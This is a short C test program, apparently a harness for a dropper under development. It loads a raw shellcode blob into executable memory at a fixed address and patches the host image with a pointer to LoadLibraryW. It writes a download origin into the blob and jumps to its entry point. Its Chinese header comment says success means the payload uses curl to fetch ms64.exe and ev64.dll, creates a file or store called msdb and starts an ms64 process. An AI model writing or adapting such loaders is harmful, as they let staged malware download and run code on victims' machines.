/* w4test.c — v4 宿主验证：blob→RWX，注入 origin，调 ENTRY。
 * 期望：curl 拉回 ms64.exe/ev64.dll（字节一致）+ msdb 创建 + ms64 进程存在。 */
#include <stdio.h>
#include <string.h>
#include <windows.h>
char PAD[0x400000] = {[0 ... 3] = 1};

#define ENTRY 0x9e
#define ORIGIN_OFF 0x950

int main(void) {
  unsigned char* ibase = (unsigned char*)GetModuleHandleA(NULL);
  *(void**)(ibase + 0x3BE4B8) = (void*)GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryW");
  unsigned char* R = (unsigned char*)VirtualAlloc((void*)0x71000000000ull, 0x8000,
      MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
  if (!R) { printf("valloc fail\n"); return 1; }
  FILE* f = fopen("payload_w4.bin", "rb");
  if (!f) { printf("no payload_w4.bin\n"); return 1; }
  int n = (int)fread(R, 1, 0x8000, f); fclose(f);
  printf("blob=%d entry=0x%x origin@0x%x\n", n, ENTRY, ORIGIN_OFF);

  const char* org = "http://127.0.0.1:8765";
  for (int i = 0; i <= (int)strlen(org); i++) R[ORIGIN_OFF + i] = (unsigned char)org[i];
  printf("origin='%s'\n", R + ORIGIN_OFF); fflush(stdout);

  ((void (*)(void))(R + ENTRY))();
  printf("payload returned, waiting 15s\n"); fflush(stdout);
  Sleep(15000);
  return 0;
}
